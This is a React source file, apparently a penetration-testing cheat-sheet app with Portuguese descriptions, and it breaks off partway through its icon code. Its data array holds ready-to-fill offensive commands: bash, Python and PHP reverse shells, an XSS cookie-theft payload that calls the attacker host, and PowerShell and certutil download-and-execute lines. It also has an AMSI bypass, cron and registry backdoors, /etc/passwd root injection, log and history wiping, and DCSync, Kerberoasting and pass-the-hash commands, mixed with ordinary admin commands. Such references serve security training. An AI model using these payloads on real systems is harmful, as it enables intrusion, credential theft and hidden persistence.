import { useState, useEffect, useRef } from "react";

// ── CATEGORIES ────────────────────────────────────────────────────────────────
const CATEGORIES = [
  "All","Recon","Web Attacks","API Attacks","Shells",
  "Linux PrivEsc","Windows PrivEsc","Windows Admin","Windows Server",
  "AD Recon","AD Attacks","AD Lateral",
  "Persistence","Evasion / OPSEC","C2 Frameworks","Tunneling","File Transfer",
  "Injection","Sysadmin","Firewall / FortiGate","Redes / Cloud","Hash Cracking",
  "Misc / Snippets","Custom"
];

const TAG_STYLE = {
  critical:"bg-red-900/60 text-red-300 border-red-700",
  high:"bg-orange-900/60 text-orange-300 border-orange-700",
  medium:"bg-yellow-900/60 text-yellow-300 border-yellow-700",
  osep:"bg-purple-900/60 text-purple-300 border-purple-700",
  new:"bg-blue-900/60 text-blue-300 border-blue-700",
  custom:"bg-emerald-900/60 text-emerald-300 border-emerald-700",
};
const TAG_LABEL = {
  critical:"🔴 Critical",high:"🟠 High",medium:"🟡 Medium",
  osep:"💜 OSEP",new:"🔵 New",custom:"🟢 Custom"
};
const TAGS = ["critical","high","medium","osep","new","custom"];

// ── COMMANDS DATA ─────────────────────────────────────────────────────────────
const INITIAL_COMMANDS = [
  // Recon
  {id:1,title:"Nmap Full Scan",category:"Recon",tags:["high"],command:"nmap -sC -sV -p- --min-rate 5000 -oA nmap_full {RHOST}",desc:"Varredura completa com scripts e versões"},
  {id:2,title:"Nmap UDP Top 20",category:"Recon",tags:["medium"],command:"nmap -sU --top-ports 20 {RHOST}",desc:"UDP nos 20 portas mais comuns"},
  {id:3,title:"Gobuster Dir",category:"Recon",tags:["high"],command:"gobuster dir -u http://{RHOST} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50",desc:"Enumeração de diretórios web"},
  {id:4,title:"Feroxbuster Recursive",category:"Recon",tags:["high","new"],command:"feroxbuster -u http://{RHOST} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,aspx,html --depth 3",desc:"Bruteforce recursivo de diretórios"},
  {id:5,title:"Ffuf Vhost",category:"Recon",tags:["medium"],command:"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{RHOST} -H 'Host: FUZZ.{DOMAIN}' -fs 0",desc:"Enumeração de virtual hosts"},
  {id:6,title:"Whatweb",category:"Recon",tags:["medium"],command:"whatweb -a 3 http://{RHOST}",desc:"Fingerprint de tecnologias web"},
  {id:7,title:"Subfinder",category:"Recon",tags:["medium","new"],command:"subfinder -d {DOMAIN} -silent -o subs.txt",desc:"Enumeração passiva de subdomínios"},
  {id:8,title:"Httpx Probe",category:"Recon",tags:["medium"],command:"httpx -l subs.txt -status-code -tech-detect -title -o live.txt",desc:"Proba de hosts vivos com detecção de tech"},
  // Web Attacks
  {id:9,title:"SQLMap Basic",category:"Web Attacks",tags:["high"],command:"sqlmap -u 'http://{RHOST}/page?id=1' --dbs --batch --level 3 --risk 2",desc:"Injeção SQL automatizada"},
  {id:10,title:"SQLMap POST",category:"Web Attacks",tags:["high"],command:"sqlmap -u 'http://{RHOST}/login' --data='user=a&pass=b' --dbs --batch",desc:"SQLMap em formulário POST"},
  {id:11,title:"XSS Payload Basic",category:"Web Attacks",tags:["medium"],command:"<script>fetch('http://{LHOST}:{LPORT}/'+document.cookie)</script>",desc:"Roubo de cookie via XSS"},
  {id:12,title:"LFI Basic",category:"Web Attacks",tags:["high"],command:"curl 'http://{RHOST}/page?file=../../../../etc/passwd'",desc:"Local File Inclusion básico"},
  {id:13,title:"LFI PHP Filter",category:"Web Attacks",tags:["high"],command:"curl 'http://{RHOST}/page?file=php://filter/convert.base64-encode/resource=index.php'",desc:"LFI com PHP filter para ler código fonte"},
  {id:14,title:"SSRF Basic",category:"Web Attacks",tags:["high"],command:"curl 'http://{RHOST}/fetch?url=http://169.254.169.254/latest/meta-data/'",desc:"SSRF para AWS metadata"},
  {id:15,title:"Open Redirect",category:"Web Attacks",tags:["medium"],command:"curl -i 'http://{RHOST}/redirect?url=https://evil.com'",desc:"Teste de open redirect"},
  // API Attacks
  {id:16,title:"API Enum Endpoints",category:"API Attacks",tags:["medium"],command:"ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://{RHOST}/api/FUZZ -mc 200,201,204,301,302",desc:"Enumeração de endpoints REST"},
  {id:17,title:"JWT None Alg",category:"API Attacks",tags:["critical"],command:"python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')\"",desc:"JWT com algoritmo none (bypass)"},
  {id:18,title:"API Auth Header Test",category:"API Attacks",tags:["medium"],command:"curl -H 'Authorization: Bearer {PASS}' http://{RHOST}/api/v1/users",desc:"Teste de autenticação Bearer token"},
  {id:19,title:"GraphQL Introspection",category:"API Attacks",tags:["medium","new"],command:"curl -X POST http://{RHOST}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' ",desc:"Dump do schema GraphQL via introspection"},
  // Shells
  {id:20,title:"Bash Reverse Shell",category:"Shells",tags:["critical"],command:"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",desc:"Reverse shell em bash"},
  {id:21,title:"Python3 Reverse Shell",category:"Shells",tags:["critical"],command:"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",desc:"Reverse shell Python3"},
  {id:22,title:"Netcat Listener",category:"Shells",tags:["high"],command:"nc -lvnp {LPORT}",desc:"Listener netcat"},
  {id:23,title:"MSFvenom EXE",category:"Shells",tags:["critical","osep"],command:"msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",desc:"Payload Windows reverse shell"},
  {id:24,title:"Upgrade to PTY",category:"Shells",tags:["high"],command:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo && fg",desc:"Upgrade de shell simples para PTY interativo"},
  {id:25,title:"PHP Reverse Shell",category:"Shells",tags:["critical"],command:"php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",desc:"Reverse shell PHP one-liner"},
  // Linux PrivEsc
  {id:26,title:"LinPEAS",category:"Linux PrivEsc",tags:["high"],command:"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",desc:"Enumeração automática de privesc Linux"},
  {id:27,title:"SUID Find",category:"Linux PrivEsc",tags:["high"],command:"find / -perm -u=s -type f 2>/dev/null",desc:"Busca por binários SUID"},
  {id:28,title:"Sudo -l",category:"Linux PrivEsc",tags:["high"],command:"sudo -l 2>/dev/null",desc:"Lista permissões sudo do usuário atual"},
  {id:29,title:"Crontab Check",category:"Linux PrivEsc",tags:["medium"],command:"cat /etc/crontab && ls -la /etc/cron.*",desc:"Verifica crontabs do sistema"},
  {id:30,title:"Writable /etc/passwd",category:"Linux PrivEsc",tags:["critical"],command:"echo 'hax:$(openssl passwd -1 hax123):0:0:root:/root:/bin/bash' >> /etc/passwd && su hax",desc:"Adiciona root se /etc/passwd for gravável"},
  // Windows PrivEsc
  {id:31,title:"WinPEAS",category:"Windows PrivEsc",tags:["high"],command:"certutil -urlcache -f http://{LHOST}/winpeas.exe C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe",desc:"Download e execução do WinPEAS"},
  {id:32,title:"PowerShell Bypass",category:"Windows PrivEsc",tags:["high","osep"],command:"powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/script.ps1')\"",desc:"Execução de script remoto com bypass de política"},
  {id:33,title:"AlwaysInstallElevated",category:"Windows PrivEsc",tags:["critical"],command:"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",desc:"Verifica AlwaysInstallElevated"},
  {id:34,title:"SeImpersonate Check",category:"Windows PrivEsc",tags:["critical"],command:"whoami /priv | findstr /i \"SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege\"",desc:"Verifica privilégios para Potato attacks"},
  // AD Recon
  {id:35,title:"BloodHound Ingestor",category:"AD Recon",tags:["critical","osep"],command:"bloodhound-python -u {USER} -p {PASS} -d {DOMAIN} -dc {DC} -c All --zip",desc:"Coleta dados do AD para BloodHound"},
  {id:36,title:"Enum4linux",category:"AD Recon",tags:["high"],command:"enum4linux -a {RHOST}",desc:"Enumeração completa SMB/AD"},
  {id:37,title:"Kerbrute Users",category:"AD Recon",tags:["high"],command:"kerbrute userenum --dc {DC} -d {DOMAIN} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",desc:"Enumeração de usuários AD via Kerberos"},
  {id:38,title:"GetADUsers",category:"AD Recon",tags:["medium"],command:"GetADUsers.py -all {DOMAIN}/{USER}:{PASS} -dc-ip {DC}",desc:"Lista todos os usuários do domínio"},
  // AD Attacks
  {id:39,title:"AS-REP Roasting",category:"AD Attacks",tags:["critical","osep"],command:"GetNPUsers.py {DOMAIN}/ -usersfile users.txt -dc-ip {DC} -no-pass -format hashcat",desc:"AS-REP Roasting para contas sem pré-autenticação"},
  {id:40,title:"Kerberoasting",category:"AD Attacks",tags:["critical","osep"],command:"GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -outputfile kerberoast.txt",desc:"Kerberoasting — coleta TGS para cracking offline"},
  {id:41,title:"Pass-the-Hash",category:"AD Attacks",tags:["critical","osep"],command:"evil-winrm -i {RHOST} -u {USER} -H {HASH}",desc:"Autenticação com NTLM hash via WinRM"},
  {id:42,title:"psexec PTH",category:"AD Attacks",tags:["critical"],command:"psexec.py {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}",desc:"Execução remota via PTH com psexec"},
  {id:43,title:"DCSync",category:"AD Attacks",tags:["critical","osep"],command:"secretsdump.py {DOMAIN}/{USER}:{PASS}@{DC} -just-dc-ntlm",desc:"DCSync para extrair hashes do domínio"},
  // AD Lateral
  {id:44,title:"PsExec",category:"AD Lateral",tags:["high","osep"],command:"psexec.py {DOMAIN}/{USER}:{PASS}@{RHOST} cmd.exe",desc:"Execução remota via SMB"},
  {id:45,title:"CrackMapExec SMB",category:"AD Lateral",tags:["high"],command:"crackmapexec smb {RHOST}/24 -u {USER} -p {PASS} --shares",desc:"Spray de credenciais na rede via CME"},
  {id:46,title:"WMIexec",category:"AD Lateral",tags:["high","osep"],command:"wmiexec.py {DOMAIN}/{USER}:{PASS}@{RHOST}",desc:"Execução remota via WMI"},
  // Persistence
  {id:47,title:"Cron Backdoor Linux",category:"Persistence",tags:["critical"],command:"echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"' | crontab -",desc:"Backdoor via crontab com reverse shell"},
  {id:48,title:"SSH Authorized Key",category:"Persistence",tags:["high"],command:"echo 'ssh-rsa AAAA...sua_chave_publica...' >> ~/.ssh/authorized_keys",desc:"Adiciona chave SSH para persistência"},
  {id:49,title:"Windows Run Key",category:"Persistence",tags:["critical"],command:"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\Windows\\Temp\\shell.exe /f",desc:"Persistência via registro Run key"},
  {id:50,title:"Windows Scheduled Task",category:"Persistence",tags:["critical"],command:"schtasks /create /tn \"WindowsUpdate\" /tr C:\\Temp\\shell.exe /sc onlogon /ru System /f",desc:"Tarefa agendada para persistência"},
  // Evasion / OPSEC
  {id:51,title:"Encode Base64 Payload",category:"Evasion / OPSEC",tags:["osep","high"],command:"echo -n '{USER}' | base64 && echo -n '{PASS}' | base64",desc:"Codifica credenciais em base64"},
  {id:52,title:"PowerShell AMSI Bypass",category:"Evasion / OPSEC",tags:["critical","osep"],command:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",desc:"Bypass de AMSI no PowerShell"},
  {id:53,title:"Clear Bash History",category:"Evasion / OPSEC",tags:["high"],command:"history -c && unset HISTFILE && export HISTSIZE=0",desc:"Limpa histórico de comandos bash"},
  {id:54,title:"Timestomp",category:"Evasion / OPSEC",tags:["osep"],command:"touch -r /etc/passwd /tmp/shell",desc:"Copia timestamp de arquivo legítimo"},
  // C2 Frameworks
  {id:55,title:"Metasploit Handler",category:"C2 Frameworks",tags:["critical","osep"],command:"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run\"",desc:"Handler MSF para receber reverse shell"},
  {id:56,title:"Sliver C2 Implant",category:"C2 Frameworks",tags:["critical","osep","new"],command:"generate --mtls {LHOST}:{LPORT} --os windows --arch amd64 --save /tmp/implant.exe",desc:"Gera implant Sliver via mTLS"},
  {id:57,title:"Havoc Demon",category:"C2 Frameworks",tags:["critical","osep","new"],command:"# Gerar no Havoc UI: Payload → Demon → Windows EXE → HTTPS → {LHOST}:{LPORT}",desc:"Geração de agente Havoc C2"},
  // Tunneling
  {id:58,title:"Chisel Server",category:"Tunneling",tags:["high","osep"],command:"chisel server -p 8080 --reverse",desc:"Inicia servidor Chisel para tunneling reverso"},
  {id:59,title:"Chisel Client Reverse",category:"Tunneling",tags:["high","osep"],command:"chisel client {LHOST}:8080 R:socks",desc:"Conecta ao servidor e abre SOCKS5 reverso"},
  {id:60,title:"SSH Dynamic Tunnel",category:"Tunneling",tags:["high"],command:"ssh -D 1080 -f -N {USER}@{RHOST}",desc:"Proxy SOCKS5 dinâmico via SSH"},
  {id:61,title:"Ligolo-ng Proxy",category:"Tunneling",tags:["high","new"],command:"./proxy -selfcert & ./agent -connect {LHOST}:11601 -ignore-cert",desc:"Tunneling transparente via Ligolo-ng"},
  // File Transfer
  {id:62,title:"Python HTTP Server",category:"File Transfer",tags:["medium"],command:"python3 -m http.server {LPORT}",desc:"Servidor HTTP simples para transferência"},
  {id:63,title:"Wget Download",category:"File Transfer",tags:["medium"],command:"wget http://{LHOST}:{LPORT}/{USER} -O /tmp/file",desc:"Download via wget"},
  {id:64,title:"Certutil Download",category:"File Transfer",tags:["high"],command:"certutil -urlcache -split -f http://{LHOST}/{USER} C:\\Temp\\file.exe",desc:"Download no Windows via certutil"},
  {id:65,title:"PowerShell Download",category:"File Transfer",tags:["high"],command:"(New-Object Net.WebClient).DownloadFile('http://{LHOST}/{USER}','C:\\Temp\\file.exe')",desc:"Download via PowerShell"},
  // Injection
  {id:66,title:"DLL Injection",category:"Injection",tags:["critical","osep"],command:"python3 inject.py --pid {RPORT} --dll C:\\Temp\\shell.dll",desc:"Injeção de DLL em processo alvo"},
  {id:67,title:"Process Hollowing Check",category:"Injection",tags:["critical","osep"],command:"Get-Process | Where-Object {$_.MainModule.FileName -notlike 'C:\\Windows\\*'} | Select Name,Id,Path",desc:"Identifica processos suspeitos para hollowing"},
  // Sysadmin
  {id:68,title:"Verificar Portas Abertas",category:"Sysadmin",tags:["medium"],command:"ss -tlnp",desc:"Lista portas TCP em escuta com processos"},
  {id:69,title:"Logs em Tempo Real",category:"Sysadmin",tags:["medium"],command:"journalctl -f -u {USER}",desc:"Segue logs de serviço em tempo real"},
  {id:70,title:"Uso de Disco",category:"Sysadmin",tags:["medium"],command:"df -hT && du -sh /*/ 2>/dev/null | sort -rh | head -20",desc:"Visão geral de uso de disco por diretório"},
  {id:71,title:"Top Processos CPU",category:"Sysadmin",tags:["medium"],command:"ps aux --sort=-%cpu | head -15",desc:"Top 15 processos por consumo de CPU"},
  // Firewall / FortiGate
  {id:72,title:"FortiGate - API Token Test",category:"Firewall / FortiGate",tags:["medium","custom"],command:"curl -k -H 'Authorization: Bearer {PASS}' 'https://{RHOST}/api/v2/monitor/system/status'",desc:"Testa conectividade com API REST FortiGate"},
  {id:73,title:"FortiGate - Listar Políticas",category:"Firewall / FortiGate",tags:["medium","custom"],command:"curl -k -H 'Authorization: Bearer {PASS}' 'https://{RHOST}/api/v2/cmdb/firewall/policy'",desc:"Lista todas as políticas de firewall"},
  {id:74,title:"FortiGate - DHCP Leases",category:"Firewall / FortiGate",tags:["medium","custom"],command:"curl -k -H 'Authorization: Bearer {PASS}' 'https://{RHOST}/api/v2/monitor/system/dhcp'",desc:"Lista leases DHCP ativos por VLAN"},
  {id:75,title:"iptables - Ver Regras",category:"Firewall / FortiGate",tags:["medium"],command:"iptables -L -n -v --line-numbers",desc:"Lista regras iptables com contadores"},
  // Redes / Cloud
  {id:76,title:"AWS - Listar S3",category:"Redes / Cloud",tags:["medium"],command:"aws s3 ls --profile {USER}",desc:"Lista todos os buckets S3 acessíveis"},
  {id:77,title:"AWS - Metadata IMDSv1",category:"Redes / Cloud",tags:["high"],command:"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",desc:"Acessa metadados AWS (IMDSv1)"},
  {id:78,title:"VPN - Checar Rotas",category:"Redes / Cloud",tags:["medium","custom"],command:"ip route show && ip route show table all | grep -v '^default'",desc:"Lista todas as rotas incluindo tabelas customizadas"},
  // Hash Cracking
  {id:79,title:"Hashcat NTLM",category:"Hash Cracking",tags:["critical"],command:"hashcat -m 1000 {HASH} /usr/share/wordlists/rockyou.txt --force",desc:"Crack de hash NTLM com rockyou"},
  {id:80,title:"Hashcat Kerberoast",category:"Hash Cracking",tags:["critical"],command:"hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force",desc:"Crack de TGS Kerberoast"},
  {id:81,title:"John SSH Key",category:"Hash Cracking",tags:["high"],command:"ssh2john id_rsa > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",desc:"Crack de chave SSH privada protegida"},
  // Windows Admin
  {id:85,title:"Informações de Rede",category:"Windows Admin",tags:["medium"],command:"ipconfig /all",desc:"Exibe configurações completas de rede (IP, MAC, DNS, Gateway)"},
  {id:86,title:"Conexões Ativas",category:"Windows Admin",tags:["medium"],command:"netstat -ano",desc:"Lista conexões TCP/UDP ativas com PID do processo"},
  {id:87,title:"Processos em Execução",category:"Windows Admin",tags:["medium"],command:"tasklist /v",desc:"Lista todos os processos com usuário e uso de memória"},
  {id:88,title:"Informações do Sistema",category:"Windows Admin",tags:["medium"],command:"systeminfo",desc:"Exibe detalhes do SO, hardware, hotfixes instalados"},
  {id:89,title:"Listar Usuários Locais",category:"Windows Admin",tags:["medium"],command:"net user",desc:"Lista todos os usuários locais da máquina"},
  {id:90,title:"Membros do Grupo Admins",category:"Windows Admin",tags:["high"],command:"net localgroup administrators",desc:"Lista membros do grupo Administradores local"},
  {id:91,title:"Criar Usuário Local",category:"Windows Admin",tags:["high"],command:"net user {USER} {PASS} /add && net localgroup administrators {USER} /add",desc:"Cria usuário local e adiciona ao grupo de admins"},
  {id:92,title:"Serviços em Execução",category:"Windows Admin",tags:["medium"],command:"Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName | Format-Table -AutoSize",desc:"Lista serviços ativos via PowerShell"},
  {id:93,title:"Iniciar / Parar Serviço",category:"Windows Admin",tags:["medium"],command:"Start-Service -Name '{USER}' ; Stop-Service -Name '{USER}'",desc:"Inicia ou para um serviço pelo nome"},
  {id:94,title:"Verificar Conectividade TCP",category:"Windows Admin",tags:["medium"],command:"Test-NetConnection -ComputerName {RHOST} -Port {RPORT}",desc:"Testa conectividade TCP em porta específica (equivale ao telnet)"},
  {id:95,title:"Adaptadores de Rede",category:"Windows Admin",tags:["medium"],command:"Get-NetAdapter | Format-Table Name,Status,LinkSpeed,MacAddress -AutoSize",desc:"Lista adaptadores de rede e seus estados"},
  {id:96,title:"Permissões de Arquivo/Pasta",category:"Windows Admin",tags:["medium"],command:"icacls C:\\{USER}",desc:"Exibe ou modifica ACLs de arquivos e pastas"},
  {id:97,title:"Resultado de Política de Grupo",category:"Windows Admin",tags:["medium"],command:"gpresult /r /scope computer",desc:"Mostra as GPOs aplicadas no computador e usuário"},
  {id:98,title:"Verificador de Arquivos do Sistema",category:"Windows Admin",tags:["high"],command:"sfc /scannow",desc:"Verifica e repara arquivos de sistema corrompidos"},
  {id:99,title:"Logs de Segurança (últimos 50)",category:"Windows Admin",tags:["high"],command:"Get-WinEvent -LogName Security -MaxEvents 50 | Format-List TimeCreated,Id,Message",desc:"Lê os 50 eventos mais recentes do log de Segurança"},
  {id:100,title:"Robocopy com Log",category:"Windows Admin",tags:["medium"],command:"robocopy C:\\Origem D:\\Destino /MIR /LOG:C:\\robocopy.log /TEE",desc:"Cópia/espelhamento de pastas com log detalhado"},
  {id:101,title:"Informações de Versão do OS",category:"Windows Admin",tags:["medium"],command:"(Get-WmiObject Win32_OperatingSystem).Caption; (Get-WmiObject Win32_OperatingSystem).BuildNumber",desc:"Exibe nome e build number do Windows"},
  {id:102,title:"Listar Hotfixes Instalados",category:"Windows Admin",tags:["medium"],command:"Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object HotFixID,InstalledOn,Description | Format-Table -AutoSize",desc:"Lista patches KB instalados com data"},
  {id:103,title:"Firewall - Ver Regras",category:"Windows Admin",tags:["medium"],command:"Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select DisplayName,Direction,Action | Format-Table -AutoSize",desc:"Lista regras de firewall ativas do Windows"},
  {id:104,title:"Disco - Uso por Volume",category:"Windows Admin",tags:["medium"],command:"Get-PSDrive -PSProvider FileSystem | Select Name,Used,Free | Format-Table -AutoSize",desc:"Exibe uso e espaço livre por volume"},
  // Windows Server
  {id:105,title:"Funções Instaladas",category:"Windows Server",tags:["medium"],command:"Get-WindowsFeature | Where-Object {$_.Installed} | Select DisplayName,Name | Format-Table -AutoSize",desc:"Lista todas as roles e features instaladas no servidor"},
  {id:106,title:"Instalar Role/Feature",category:"Windows Server",tags:["high"],command:"Install-WindowsFeature -Name {USER} -IncludeManagementTools -Restart",desc:"Instala uma role com ferramentas de gestão (ex: AD-Domain-Services)"},
  {id:107,title:"Informações do Domínio",category:"Windows Server",tags:["medium"],command:"Get-ADDomain | Select DNSRoot,NetBIOSName,DomainMode,PDCEmulator",desc:"Exibe informações básicas do domínio AD"},
  {id:108,title:"Listar Domain Controllers",category:"Windows Server",tags:["medium"],command:"Get-ADDomainController -Filter * | Select HostName,IPv4Address,Site,IsGlobalCatalog | Format-Table -AutoSize",desc:"Lista todos os DCs do domínio com site e IP"},
  {id:109,title:"FSMO Roles",category:"Windows Server",tags:["medium"],command:"netdom query fsmo",desc:"Exibe qual DC detém cada role FSMO do domínio"},
  {id:110,title:"Replicação AD",category:"Windows Server",tags:["high"],command:"repadmin /showrepl",desc:"Mostra status de replicação entre Domain Controllers"},
  {id:111,title:"Listar Usuários AD",category:"Windows Server",tags:["medium"],command:"Get-ADUser -Filter * -Properties DisplayName,LastLogonDate | Select SamAccountName,DisplayName,Enabled,LastLogonDate | Sort-Object SamAccountName | Format-Table -AutoSize",desc:"Lista todos os usuários do domínio com último logon"},
  {id:112,title:"Criar Usuário AD",category:"Windows Server",tags:["high"],command:"New-ADUser -Name '{USER}' -SamAccountName '{USER}' -UserPrincipalName '{USER}@{DOMAIN}' -AccountPassword (ConvertTo-SecureString '{PASS}' -AsPlainText -Force) -Enabled $true",desc:"Cria novo usuário no Active Directory"},
  {id:113,title:"Resetar Senha AD",category:"Windows Server",tags:["high"],command:"Set-ADAccountPassword -Identity '{USER}' -NewPassword (ConvertTo-SecureString '{PASS}' -AsPlainText -Force) -Reset && Unlock-ADAccount -Identity '{USER}'",desc:"Reseta senha e desbloqueia conta AD"},
  {id:114,title:"Listar Grupos AD",category:"Windows Server",tags:["medium"],command:"Get-ADGroup -Filter * | Select Name,GroupScope,GroupCategory | Sort-Object Name | Format-Table -AutoSize",desc:"Lista todos os grupos do domínio"},
  {id:115,title:"Membros de Grupo AD",category:"Windows Server",tags:["medium"],command:"Get-ADGroupMember -Identity '{USER}' -Recursive | Select Name,SamAccountName,ObjectClass",desc:"Lista membros recursivos de um grupo AD"},
  {id:116,title:"Zonas DNS",category:"Windows Server",tags:["medium"],command:"Get-DnsServerZone | Select ZoneName,ZoneType,IsDsIntegrated | Format-Table -AutoSize",desc:"Lista zonas DNS configuradas no servidor"},
  {id:117,title:"Registros DNS de Zona",category:"Windows Server",tags:["medium"],command:"Get-DnsServerResourceRecord -ZoneName '{DOMAIN}' | Select HostName,RecordType,RecordData | Format-Table -AutoSize",desc:"Lista todos os registros de uma zona DNS"},
  {id:118,title:"Escopos DHCP",category:"Windows Server",tags:["medium"],command:"Get-DhcpServerv4Scope | Select ScopeId,Name,StartRange,EndRange,State | Format-Table -AutoSize",desc:"Lista escopos DHCP com range e estado"},
  {id:119,title:"Leases DHCP Ativos",category:"Windows Server",tags:["medium"],command:"Get-DhcpServerv4Lease -ScopeId {RHOST} | Select IPAddress,HostName,ClientId,LeaseExpiryTime | Format-Table -AutoSize",desc:"Lista leases DHCP ativos em um escopo"},
  {id:120,title:"Listar GPOs",category:"Windows Server",tags:["medium"],command:"Get-GPO -All | Select DisplayName,GpoStatus,CreationTime | Sort-Object DisplayName | Format-Table -AutoSize",desc:"Lista todas as GPOs do domínio"},
  {id:121,title:"Forçar Atualização de GPO",category:"Windows Server",tags:["medium"],command:"Invoke-GPUpdate -Force -RandomDelayInMinutes 0",desc:"Força atualização imediata de políticas de grupo"},
  {id:122,title:"Política de Senha do Domínio",category:"Windows Server",tags:["medium"],command:"Get-ADDefaultDomainPasswordPolicy | Select MinPasswordLength,PasswordHistoryCount,MaxPasswordAge,LockoutThreshold",desc:"Exibe a política de senha padrão do domínio"},
  {id:123,title:"Backup de Estado do Sistema",category:"Windows Server",tags:["high"],command:"wbadmin start systemstatebackup -backuptarget:{RHOST}:",desc:"Inicia backup do estado do sistema (AD, DNS, registro)"},
  {id:124,title:"Verificar Saúde do AD",category:"Windows Server",tags:["high"],command:"dcdiag /test:replications /test:dns /test:netlogons /v",desc:"Diagnóstico completo do Domain Controller"},
  // Misc / Snippets
  {id:82,title:"Socat Bind Shell",category:"Misc / Snippets",tags:["high"],command:"socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",desc:"Bind shell via socat com PTY"},
  {id:83,title:"Tcpdump Captura",category:"Misc / Snippets",tags:["medium"],command:"tcpdump -i any -w /tmp/cap.pcap 'host {RHOST}'",desc:"Captura tráfego de/para host específico"},
  {id:84,title:"Nuclei Scan",category:"Misc / Snippets",tags:["high","new"],command:"nuclei -u http://{RHOST} -t nuclei-templates/ -severity critical,high -o nuclei_out.txt",desc:"Scan automatizado de vulnerabilidades com Nuclei"},
];

// ── VARS ──────────────────────────────────────────────────────────────────────
const VAR_KEYS = ["LHOST","RHOST","LPORT","RPORT","DOMAIN","DC","USER","PASS","HASH","URL"];
const VAR_PLACEHOLDERS = {
  LHOST:"10.10.14.1",RHOST:"10.10.10.10",LPORT:"4444",RPORT:"80",
  DOMAIN:"corp.local",DC:"dc01.corp.local",USER:"administrator",
  PASS:"Password123",HASH:"aad3b435...",URL:"http://target/"
};

function applyVars(cmd, vars) {
  return VAR_KEYS.reduce((acc, k) => acc.replaceAll(`{${k}}`, vars[k] || `{${k}}`), cmd);
}

function formatTime(s) {
  const h = String(Math.floor(s/3600)).padStart(2,"0");
  const m = String(Math.floor((s%3600)/60)).padStart(2,"0");
  const sec = String(s%60).padStart(2,"0");
  return `${h}:${m}:${sec}`;
}

// ── ICONS ─────────────────────────────────────────────────────────────────────
const I = ({ n, s=14 }) => {
  const icons = {
    search:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>,
    copy:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>,
    star:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>,
    starF:<svg width={s} height={s} viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" strokeWidth="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>,
    ai:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 2a10 10 0 1 0 10 10"/><path d="M12 8v4l3 3"/><circle cx="18" cy="6" r="3"/></svg>,
    close:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6 6 18M6 6l12 12"/></svg>,
    plus:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M5 12h14M12 5v14"/></svg>,
    vars:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M4 7h16M4 12h16M4 17h10"/></svg>,
    check:<svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M20 6 9 17l-5-5"/></svg>,
